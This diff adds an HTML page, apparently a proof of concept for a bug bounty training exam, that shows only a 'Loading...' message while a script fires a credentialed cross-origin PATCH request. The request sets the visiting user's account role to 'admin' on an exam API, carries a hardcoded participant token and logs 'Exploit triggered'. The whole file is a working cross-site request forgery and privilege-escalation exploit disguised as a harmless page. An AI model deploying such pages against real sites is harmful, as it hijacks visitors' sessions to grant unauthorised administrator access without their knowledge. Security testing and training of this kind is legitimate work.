@@ -1,0 +1,23 @@
+<html>
+  <body>
+    <script>
+      fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/profile', {
+        method: 'PATCH',
+        mode: 'cors',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/json',
+          // Important: We include the participant token to identify YOU
+          'X-Participant-Token': 'pt_1b3dc783f60b2febc8ec1cf75e880aac9d1d62c19b7fae1f0a143d6afbeb858c_7a3b42e022441584'
+        },
+        body: JSON.stringify({
+          "role": "admin"
+        })
+      }).then(response => {
+        console.log("Exploit triggered");
+      });
+    </script>
+    <h1>Loading...</h1>
+    <p>Please wait while the resource loads.</p>
+  </body>
+</html>
